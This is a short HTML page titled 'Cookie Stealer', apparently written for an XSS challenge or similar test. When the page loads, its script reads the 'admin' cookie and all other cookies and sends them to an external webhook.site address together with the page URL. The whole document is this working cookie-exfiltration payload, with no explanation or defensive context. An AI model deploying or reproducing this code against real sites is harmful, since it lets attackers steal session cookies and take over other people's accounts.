<!doctype html>
<html>
<head>
  <meta charset="utf-8"/>
  <title>Cookie Stealer</title>
</head>
<body>
  <h1>Loading...</h1>

<script>
// Function to get admin cookie value
function getAdminCookie() {
  const cookies = document.cookie.split(';');
  for (let cookie of cookies) {
    const [name, value] = cookie.trim().split('=');
    if (name === 'admin') {
      return decodeURIComponent(value);
    }
  }
  return null;
}

// Get the admin cookie immediately when page loads
const adminValue = getAdminCookie();

// Send to webhook
fetch('https://webhook.site/d0cfa850-4cfd-4b43-8de0-af4fb3f51c86', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json',
  },
  body: JSON.stringify({
    adminCookie: adminValue,
    allCookies: document.cookie,
    timestamp: new Date().toISOString(),
    url: window.location.href
  })
}).then(() => {
  console.log('Admin cookie sent:', adminValue);
}).catch(err => {
  console.error('Failed to send:', err);
});
</script>
</body>
</html>
